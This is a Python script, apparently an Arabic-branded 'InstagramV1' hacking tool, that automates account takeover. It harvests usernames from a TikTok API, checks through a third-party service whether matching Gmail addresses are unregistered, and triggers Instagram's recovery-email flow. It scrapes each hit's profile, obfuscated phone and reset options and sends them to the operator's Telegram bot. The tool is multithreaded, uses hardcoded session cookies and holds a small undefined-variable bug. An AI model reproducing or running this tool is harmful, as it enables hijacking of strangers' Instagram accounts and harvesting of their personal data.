import random,threading,requests,urllib.request,uuid,os
from uuid import uuid4
from user_agent import generate_user_agent
from secrets import token_hex
from rich.console import Console
from rich.table import Table
csr = token_hex(8) * 2
uid = uuid4()
nob = str(uuid.uuid4())
DvD = "android-" + str(uuid.uuid4())
Lol = str(uuid.uuid4())
Gio = str(uuid.uuid4())
hh = 0
bb = 0
gg = 0
GM = 0
BM = 0
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
R = '\x1b[1;34m'
print(f'''{B}{E}=============================={B}

|{F}[+] TeleGram  : {X} @WDEH_ALROSE  |
|{F}[+] Instagram  : {X} @WDEH_ALROSE |
|{F}[+] Tool  : {X}       | متاحات InstagramV1 

{E}==============================''')
print('\n')
token = input(f' {F}({C} 𖡹 {F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
print(A + ' ═════════════════════════════════  ')
ID = input(f' {F}({C} 𖡹 {F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)
def tlg(email):
    user = email.split('@')[0]
    heada = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Host": "i.instagram.com","Connection": "Keep-Alive","User-Agent": generate_user_agent(),"Cookie":f"mid=YwvCRAABAAEsZcmT0OGJdPu3iLUs; csrftoken={csr}","Cookie2": "$Version=1","Accept-Language": "en-US","X-IG-Capabilities": "AQ==","Accept-Encoding": "gzip",}
    datai = {"q": user,"device_id": f"android{uid}","guid": uid,"_csrftoken": csr}
    res = requests.post('https://i.instagram.com/api/v1/users/lookup/',headers=heada, data=datai).json()
    email = res.get('obfuscated_email')
    phone = res.get('obfuscated_phone')
    Private = res['user'].get('is_private')
    FP = res.get('fb_login_option')
    WH = res.get('can_wa_reset')
    Sms = res.get('can_sms_reset')
    rest = res.get('can_email_reset')
    Ph = res.get('has_valid_phone')
    Varfid = res['user'].get('is_verified')
    he = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en;q=0.9','cookie': f'ig_did={uuid4()}; datr=8J8TZD9P4GjWjawQJMcnRdV_; mid=ZBOf_gALAAGhvjQbR29aVENHIE4Z; ig_nrcb=1; csrftoken=5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy; ds_user_id=56985317140; dpr=1.25','referer': f'https://www.instagram.com/{user}/?hl=ar','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"10.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(),'viewport-width': '1051','x-asbd-id': '198387','x-csrftoken': '5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-requested-with': 'XMLHttpRequest',}
    rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}',headers=he).json()
    Id = rr['data']['user']['id']
    Name = rr['data']['user']['full_name']
    bio = rr['data']['user']['biography']
    flos = rr['data']['user']['edge_followed_by']['count']
    flog = rr['data']['user']['edge_follow']['count']
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()
    da = re["date"]    
    message = f'''
⋘─────━𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ━─────⋙
〄 𝐍𝐀𝐌𝐄 ⇾{Name}
〄 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 ⇾@{user}
〄 𝐈𝐃 ⇾{Id}
〄 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 ⇾{flos}
〄 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 ⇾{flog}
〄 𝐁𝐈𝐎 ⇾{bio}
〄 𝐃𝐀𝐓𝐄 ⇾{da}
〄 𝐔𝐑𝐋 ⇾  https://www.instagram.com/{user}
〄 𝐄𝐌𝐀𝐈𝐋 ⇾ {user}@gmail.com
〄 𝐏𝐇𝐎𝐍𝐄 ⇾ {phone}
〄 𝐏𝐑𝐈𝐕𝐓𝐄𝐒 ⇾ {Privte}
〄 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐋𝐎𝐆𝐈𝐍 ⇾ {FP}
〄 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐑𝐄𝐒𝐄𝐓 ⇾ {WH}
〄 𝐒𝐌𝐒 𝐑𝐄𝐒𝐄𝐓 ⇾ {Sms}
〄 𝐄𝐌𝐀𝐈𝐋 𝐑𝐄𝐒𝐄𝐓 ⇾ {rest}
〄 𝐕𝐀𝐋𝐈𝐃 𝐏𝐇𝐎𝐍𝐄 ⇾ {Ph}
〄 𝐕𝐄𝐑𝐈𝐅𝐈𝐄𝐃 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 ⇾ {Varfid}
⋘─────━𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ━─────⋙

𝐃𝐄𝐕: @WDEH_ALROSE </> @YRWSYY
        '''
    requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={message}')
def ood(email):
    global gg, bb
    headers = {'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime': '1700251574.982','X-IG-Connection-Speed': '-1kbps','X-IG-Bandwidth-Speed-KBPS': '-1.000','X-IG-Bandwidth-TotalBytes-B': '0','X-IG-Bandwidth-TotalTime-MS': '0','X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0','X-IG-Connection-Type': 'WIFI','X-IG-Capabilities': '3brTvw==','X-IG-App-ID': '567067343352427','User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language': 'en-GB, en-US','Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding': 'gzip, deflate','Host': 'i.instagram.com','X-FB-HTTP-Engine': 'Liger','Connection': 'keep-alive','Content-Length': '356',}
    data = {f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}','ig_sig_key_version': '4',}
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
    if '"status":"ok"' in response:
        gg += 1
        tlg(email)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
┍━━━━━━━━━━━━━━━━━━━━━━━━┑
┋𝗗𝗘𝗩 ⁞ 𝗔𝗟𝗥𝗢𝗦𝗘 ♪ •               
┖━━━━━━━━━━━━━━━━━━━━━━━━┙

{F}(✓){F} ⌯ {F}𝗛𝗜𝗧 ➪ ⦃ {gg} ⦄
 
{F}(✓){F} ⌯ {F}𝗚𝗢𝗢𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {GM} ⦄   

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ➪ ⦃ {bb} ⦄ 

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {BM} ⦄ 
 
{B}(✓){B} ⌯ {B}𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {email} ⦄

{A} ━━━━━━━━━━━━━━━━━━━━━━━━

  {A} 𝗕𝗬 ~ @WDEH_ALROSE </> @YRWSYY''')
    else:
        bb += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
┍━━━━━━━━━━━━━━━━━━━━━━━━┑
┋𝗗𝗘𝗩 ⁞ 𝗔𝗟𝗥𝗢𝗦𝗘 ♪ •               
┖━━━━━━━━━━━━━━━━━━━━━━━━┙

{F}(✓){F} ⌯ {F}𝗛𝗜𝗧 ➪ ⦃ {gg} ⦄
 
{F}(✓){F} ⌯ {F}𝗚𝗢𝗢𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {GM} ⦄   

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ➪ ⦃ {bb} ⦄ 

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {BM} ⦄ 
 
{B}(✓){B} ⌯ {B}𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {email} ⦄

{A} ━━━━━━━━━━━━━━━━━━━━━━━━

  {A} 𝗕𝗬 ~ @WDEH_ALROSE </> @YRWSYY''')
def en(email):
    global GM, BM
    api = "https://alany-0e5f010239a3.herokuapp.com/gmail"
    params = {"email":email}
    response = requests.get(api,params=params).json()["status"]
    if response == "available":
        GM += 1
        ood(email)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
┍━━━━━━━━━━━━━━━━━━━━━━━━┑
┋𝗗𝗘𝗩 ⁞ 𝗔𝗟𝗥𝗢𝗦𝗘 ♪ •               
┖━━━━━━━━━━━━━━━━━━━━━━━━┙

{F}(✓){F} ⌯ {F}𝗛𝗜𝗧 ➪ ⦃ {gg} ⦄
 
{F}(✓){F} ⌯ {F}𝗚𝗢𝗢𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {GM} ⦄   

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ➪ ⦃ {bb} ⦄ 

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {BM} ⦄ 
 
{B}(✓){B} ⌯ {B}𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {email} ⦄

{A} ━━━━━━━━━━━━━━━━━━━━━━━━

  {A} 𝗕𝗬 ~ @WDEH_ALROSE </> @YRWSYY''')
    else:
         BM += 1
         os.system('cls' if os.name == 'nt' else 'clear')
         print(f'''
┍━━━━━━━━━━━━━━━━━━━━━━━━┑
┋𝗗𝗘𝗩 ⁞ 𝗔𝗟𝗥𝗢𝗦𝗘 ♪ •               
┖━━━━━━━━━━━━━━━━━━━━━━━━┙

{F}(✓){F} ⌯ {F}𝗛𝗜𝗧 ➪ ⦃ {gg} ⦄
 
{F}(✓){F} ⌯ {F}𝗚𝗢𝗢𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {GM} ⦄   

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ➪ ⦃ {bb} ⦄ 

{Z}(✘){Z} ⌯ {Z}𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {BM} ⦄ 
 
{B}(✓){B} ⌯ {B}𝗚𝗠𝗔𝗜𝗟 ➪ ⦃ {email} ⦄

{A} ━━━━━━━━━━━━━━━━━━━━━━━━

  {A} 𝗕𝗬 ~ @WDEH_ALROSE </> @YRWSYY''')
def generate_emails():
    while True:        
        user_1 = 'qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
        number = '6789'
        rng = int("".join(random.choice(number) for i in range(1)))
        name = str("".join(random.choice(user_1) for i in range(rng)))
        url_3 = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{name}'
        response = requests.get(url_3).json()
        aa = 0
        try:
            aa += 1
            User = response['results'][aa]['username']
            email = User + '@gmail.com'
            en(email)
        except (KeyError, IndexError):
            pass
Threads = []
for _ in range(7):
    t = threading.Thread(target=generate_emails)
    t.start()
    Threads.append(t)
for thread in Threads:
    thread.join()